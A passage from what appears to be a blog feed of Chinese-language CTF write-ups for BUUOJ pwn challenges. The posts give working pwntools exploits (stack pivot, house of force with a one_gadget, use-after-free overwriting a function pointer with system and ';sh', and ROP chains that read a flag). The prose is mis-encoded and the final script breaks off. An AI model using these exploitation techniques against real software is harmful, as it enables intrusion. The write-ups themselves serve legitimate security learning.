class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™æ¬¡æ¯”èµ›ï¼Œæˆ‘èƒ½åšçš„åº”è¯¥æ˜¯æœ‰ä¸‰é¢˜çš„ï¼Œå¯èƒ½è¿˜æ˜¯å¤ªèœäº†ï¼Œæ¯”èµ›æ—¶å°±æ˜¯æ²¡å‡ºï¼Œæœ€ç»ˆåªåšäº†ä¸ªç­¾åˆ°é¢˜ï¼Œè¿˜å¥½æ‰‹å¿«æŠ¢äº†ä¸€è¡€ï¼Œé•¿è·¯æ¼«æ¼«ï¼Œç»§ç»­åŠ æ²¹å§ï¼&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="ç¾ŠåŸæ¯" scheme="http://example.com/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>buu08</title>
    <link href="http://example.com/2021/09/05/2021-09-05-buu08/"/>
    <id>http://example.com/2021/09/05/2021-09-05-buu08/</id>
    <published>2021-09-05T07:59:06.000Z</published>
    <updated>2021-10-13T08:01:23.958Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ã€pwnable-simple-login"><a href="#ä¸€ã€pwnable-simple-login" class="headerlink" title="ä¸€ã€pwnable_simple_login"></a>ä¸€ã€pwnable_simple_login</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105207938.png" alt="image-20210910105207938"></p><p>å¸¸è§„checksecï¼Œå¼€äº†NXã€Canaryã€‚ä½†æ˜¯åˆ°IDAé‡Œé¢å‘ç°ï¼Œæ²¡çœ‹åˆ°Canaryçš„è¸ªè¿¹</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105257032.png" alt="image-20210910105257032"></p><p>IDAé‡Œé¢æœ‰åé—¨å‡½æ•°</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105318680.png" alt="image-20210910105318680"></p><p>base64è§£ç å‡½æ•°é‡Œé¢æœ‰äº›å¤æ‚ï¼Œçœ‹çš„å¾ˆéš¾å—ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºé€»è¾‘è¿›è¡Œåˆ¤æ–­ï¼Œè¿”å›çš„åº”è¯¥æ˜¯é•¿åº¦ï¼Œå› ä¸ºåº•ä¸‹è¿›è¡Œäº†æ¯”å¤§å°ï¼›è€Œsæ˜¯æˆ‘ä»¬è¾“å…¥çš„å€¼æ²¡ä»€ä¹ˆå¥½è¯´ï¼Œå°±æ˜¯è¦è¾“å…¥ä¸€ä¸ªbase64çš„å€¼è®©ä»–å†è§£ç æˆæ­£å¸¸å€¼ï¼›v5åˆ™åº”è¯¥æ˜¯è§£ç åçš„å€¼ï¼Œå› ä¸ºåº•ä¸‹æŠŠv5çš„å€¼å†™å…¥äº†inputé‡Œé¢ã€‚ä½†æ˜¯å¦‚æœæ˜¯è¦ä»¥ç¨‹åºé€»è¾‘æ‰§è¡Œåˆ°åé—¨å‡½æ•°çš„è¯ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“è¡Œä¸è¡Œï¼Œåæ­£æˆ‘æ˜¯ä¸ä¼šçš„ã€‚æƒ³çš„è‚¯å®šæ˜¯æœ‰æ²¡æœ‰å“ªé‡Œæœ‰æº¢å‡ºï¼Œè·³åˆ°åé—¨å‡½æ•°å°±è¡Œäº†ã€‚</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105421986.png" alt="image-20210910105421986"></p><p>æ‰¾äº†æ‰¾ï¼Œåœ¨authå‡½æ•°é‡Œé¢ï¼Œmemcpyå¯ä»¥æº¢å‡ºäº†ï¼Œå› ä¸ºsizeæœ€å¤§å¯ä»¥ä¸º12ï¼Œè€Œv4è·ç¦»è¿”å›å€¼åç§»ä¹Ÿä¸º12ï¼Œä¼¼ä¹ä¸å¤Ÿï¼Œåªèƒ½è¦†ç›–åˆ°ebpï¼Œä¸è¿‡å¯ä»¥å‘ç°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢æ‰§è¡Œä¸€æ¬¡leave retï¼Œç„¶åè¿™ä¸ªå‡½æ•°é€€å‡ºäº†ï¼Œåˆ°mainå‡½æ•°ï¼Œåˆšå¥½åˆå°†ä¼šç»§ç»­æ‰§è¡Œleave retã€‚æ‰€ä»¥å…¶å®å°±æ˜¯ä¸€ç§æ ˆè¿ç§»ï¼ŒæŠŠæ ˆè¿ç§»åˆ°.bssä¸Šå»ï¼Œç„¶åæ‰§è¡Œåé—¨å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25575</span>)<br>shell = <span class="hljs-number">0x08049284</span><br>input_addr = <span class="hljs-number">0x0811EB40</span><br>p.recvuntil(<span class="hljs-string">&quot;Authenticate : &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(shell) + p32(input_addr)<br>p.sendline(payload.encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="äºŒã€gyctf-2020-force"><a href="#äºŒã€gyctf-2020-force" class="headerlink" title="äºŒã€gyctf_2020_force"></a>äºŒã€gyctf_2020_force</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916151101226.png" alt="image-20210916151101226"></p><p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916153042695.png" alt="image-20210916153042695"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916153101689.png" alt="image-20210916153101689"></p><p>è¿›å…¥IDAï¼Œæ€»å…±å°±ä¸¤ä¸ªåŠŸèƒ½ï¼šä¸€ä¸ªæ˜¯ç”³è¯·å †å—ï¼Œå †å—å¤§å°æ— é™åˆ¶ï¼Œå¹¶ä¸”èƒ½è¿”å›ç»™å †åœ°å€ï¼Œç„¶åå¡«å…¥å†…å®¹æ˜¯å›ºå®šé•¿åº¦0x50ï¼›å¦å¤–ä¸€ä¸ªputsåŠŸèƒ½ã€‚ã€‚ã€‚å±ç”¨æ²¡æœ‰ï¼æ ¹æ®é¢˜ç›®æç¤ºæƒ³åˆ°house of force</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916163309864.png" alt="image-20210916163309864"></p><p>å› ä¸ºç¨‹åºä¼šè¿”å›å †çš„åœ°å€ï¼Œç¨‹åºåˆä¸é™åˆ¶å †å—çš„å¤§å°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”³è¯·ä¸€ä¸ªå¤§äºtop chunkçš„å †å—ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šè°ƒç”¨mmapè¿›è¡Œåˆ†é…å †å—ï¼Œæ­¤æ—¶å †å—çš„åœ°å€ä¼šæ˜¯libcä¸­çš„ä¸€ä¸ªåœ°å€</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916163532720.png" alt="image-20210916163532720"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916205725583.png" alt="image-20210916205725583"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916205619022.png" alt="image-20210916205619022"></p><p>ç„¶åç”³è¯·ä¸€ä¸ªå°äº0x50çš„å †å—ï¼Œè®©å †å—èƒ½è¿›è¡Œæº¢å‡ºè¦†ç›–top chunkçš„sizeä½ï¼Œä¿®æ”¹ä¸º-1ï¼ˆä¹Ÿå°±æ˜¯0xFFFFFFFFFFFFFFFFï¼‰ï¼ŒåŒæ—¶ä¹Ÿå€Ÿç€è¿™ä¸ªå †å—èƒ½è·å–åˆ°top chunkçš„åœ°å€ã€‚ä¿®æ”¹å®Œ-1ï¼Œå› ä¸ºä½¿ç”¨mallocç”³è¯·å †å—æ—¶éªŒè¯sizeçš„ç±»å‹æ˜¯æ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ†é…å¾ˆå¤§çš„å †å—ä¹Ÿä»ç„¶å¯ä»¥é€šè¿‡éªŒè¯ï¼Œå€Ÿæ­¤ç›´æ¥ç”³è¯·ä¸€ä¸ªè¶…å¤§å †å—ï¼Œç›´æ¥å æ»¡top chunkä¸__malloc_hookä¹‹é—´é•¿åº¦ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—å»ä¿®æ”¹hookçš„ä¸ºone_gadgetå³å¯</p><p>ç„¶åå‘¢ã€‚offseè‡³å°‘tå‡0x30ï¼Œå› ä¸ºæˆ‘ä»¬ç”³è¯·çš„å †å—æ˜¯æœ‰å †å¤´ï¼Œå¹¶ä¸”æ˜¯è¦è¦†ç›–ä¸¤ä¸ªhook</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916201004797.png" alt="image-20210916201004797"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210916201128484.png" alt="image-20210916201128484"></p><p>æœ€åçš„è°ƒæ•´æˆ‘æœ‰äº›ç†è§£ä¸äº†ï¼Œæ˜æ˜æŒ‡å‘ä¸æ˜¯0ï¼Œä½†æœ€åå´èƒ½getshellï¼Œåªèƒ½è¯´æ˜åº”è¯¥æ˜¯åœ¨æœ€åæ‰§è¡Œå®Œmallocåï¼Œrspåˆè¢«è°ƒæ•´äº†å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./gyctf_2020_force&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28894</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">&quot;content\n&quot;</span>)<br>p.send(content)<br><span class="hljs-keyword">return</span> addr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>libc_base = add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;a&#x27;</span>) + <span class="hljs-number">0x200ff0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>top_chunk = add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>)) + <span class="hljs-number">0x10</span> <br>log.info(<span class="hljs-string">&quot;top_chunk==&gt;0x%x&quot;</span> %top_chunk)<br>offset = mlh - top_chunk<br>add(offset-<span class="hljs-number">0x33</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span> + p64(ogg) + p64(realloc + <span class="hljs-number">0x10</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;2:puts\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€pwnable-hacknote"><a href="#ä¸‰ã€pwnable-hacknote" class="headerlink" title="ä¸‰ã€pwnable_hacknote"></a>ä¸‰ã€pwnable_hacknote</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153219237.png" alt="image-20210923153219237"></p><p>å¸¸è§„checksecï¼Œ32ä½ï¼Œæ²¡å¼€å…¨RELROï¼ŒPIEã€‚çŒœæµ‹å¯ä»¥åŠ«æŒgotè¡¨</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153712466.png" alt="image-20210923153712466"></p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153919700.png" alt="image-20210923153919700"></p><p>åœ¨ç”³è¯·å †å—åŠŸèƒ½é‡Œï¼Œå‘ç°ä¸€ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿ï¼ŒæŠŠä¸€ä¸ªè°ƒç”¨putsçš„å‡½æ•°çš„åœ°å€èµ‹å€¼ç»™äº†å †å—å†…å®¹ï¼ŒçŒœæµ‹æ‰“å°åŠŸèƒ½å°±æ˜¯ç›´æ¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆå°±å¯ä»¥è¯•ç€ä¿®æ”¹è¿™ä¸ªæŒ‡é’ˆï¼Œæ”¹ä¸ºsystemï¼Œå†æŠŠå †å—å†…å®¹ä¿®æ”¹ä¸º/bin/sh</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153939335.png" alt="image-20210923153939335"></p><p>æœç„¶ï¼Œç›´æ¥è°ƒç”¨äº†å‡½æ•°æŒ‡é’ˆ</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923153908205.png" alt="image-20210923153908205"></p><p>é‡Šæ”¾åŠŸèƒ½ï¼ŒæŒ‡é’ˆæ²¡æœ‰ç½®é›¶ï¼Œå­˜åœ¨UAF</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923193256099.png" alt="image-20210923193256099"></p><p>ç¬¬ä¸€æ­¥æ˜¯è·å–libcï¼Œæˆ‘çš„åšæ³•æ˜¯å€Ÿç€é‡Šæ”¾unsorted chunkäº§ç”Ÿlibcï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼Œè¦†ç›–fdæŒ‡é’ˆä¸ºaaaaä½œä¸ºå®šä½ï¼Œç„¶åå°†bkæŒ‡é’ˆæ‰“å°å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot;;sh\x00&quot;</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#2</span><br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>libc_base = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1B37B0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>log.info(<span class="hljs-built_in">hex</span>(system))<br></code></pre></td></tr></table></figure><p><img src="/2021/09/05/2021-09-05-buu08/image-20210923193522763.png" alt="image-20210923193522763"></p><p>ç„¶åå°±æ˜¯ä¿®æ”¹å‡½æ•°æŒ‡é’ˆï¼ŒæŠŠå‡½æ•°æŒ‡é’ˆæ”¹æˆæŒ‡å‘systemçš„ï¼Œé€šè¿‡è¿ç»­é‡Šæ”¾ä¸¤ä¸ªå †å—ï¼Œç„¶åå†ç”³è¯·å›æ¥ï¼ˆå¤§å°æ˜¯0x8çš„ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ä¸€ä¸ªå †å—æ˜¯ä¹‹å‰å¯ä»¥è°ƒç”¨showåŠŸèƒ½çš„å †å—ï¼Œä¿®æ”¹è¿™ä¸ªå †å—çš„å†…å®¹ä¸ºsystemåœ°å€ï¼Œä»¥åŠâ€;sh\x00â€ï¼ˆæˆ–æ˜¯â€||shâ€ï¼‰ï¼Œå› ä¸ºä¸Šå›¾ä¼ å…¥çš„å‚æ•°å…¶å®æ˜¯å‡½æ•°æŒ‡é’ˆçš„åœ°å€ï¼Œæ‰€ä»¥è¦ç”¨<code>ï¼›</code>æˆ–è€…<code>||</code>æ‰èƒ½ä¹Ÿæ‰§è¡Œåˆ°shè€Œè·å–åˆ°shellï¼Œç„¶åå€Ÿç€UAFæ‰§è¡ŒshowåŠŸèƒ½getshell</p><p>æœ€åï¼Œæˆ‘æ¢äº†ç½‘ä¸Šçš„åšæ³•ï¼Œæˆ‘å‰é¢ä½¿ç”¨unsorted chunkæ³„éœ²libcå¯èƒ½è¿œç¨‹æœ‰ç‚¹ä¸åŒï¼Œå¯¼è‡´æ²¡èƒ½æ‰“é€šï¼Œåªæœ‰æœ¬åœ°é€šäº†</p><p><img src="/2021/09/05/2021-09-05-buu08/image-20210924081921009.png" alt="image-20210924081921009"></p><p>ç„¶åæˆ‘å»å®éªŒäº†ä¸€ä¸‹ï¼Œå‘ç°è¿œç¨‹çš„åœ°å€æ¯”æœ¬åœ°çš„å¤šäº†0x300ï¼Œæˆ‘æ‰“äº†äº”å…­æ¬¡éƒ½æ˜¯å·®0x300ï¼Œä¹‹å‰åšbuuçš„å †é¢˜è·å–libcçš„æ–¹å¼ï¼Œæˆ‘å·²ç»è®°ä¸æ¸…äº†ï¼Œå› ä¸ºbuuä¸Šçš„libcæ˜¯è¢«åŠ¨è¿‡çš„libcï¼Œæ‰€ä»¥æˆ‘æœ¬åœ°æ‰“çš„æ—¶å€™åŠ è½½çš„å¹¶ä¸æ˜¯å’Œbuuä¸€æ¨¡ä¸€æ ·çš„libcï¼Œå¯èƒ½è¿™å°±æ˜¯å› ä¸ºå°ç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚å§ï¼Œä¸è¿‡æ ¹æ®è¿™æ¬¡æ¥çœ‹ï¼Œç‰ˆæœ¬ä¹‹é—´çš„å°å·®å¼‚ï¼Œå¯¹ç®—libcåç§»é€ æˆçš„å½±å“åº”è¯¥æ˜¯æ¯”è¾ƒå°çš„ï¼Œå‰åå¤šè¯•å‡ ä¸ª0xn00ï¼Œè¯´ä¸å®šèƒ½è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26554</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts = <span class="hljs-number">0x804862b</span><br>add(<span class="hljs-number">0x18</span>,<span 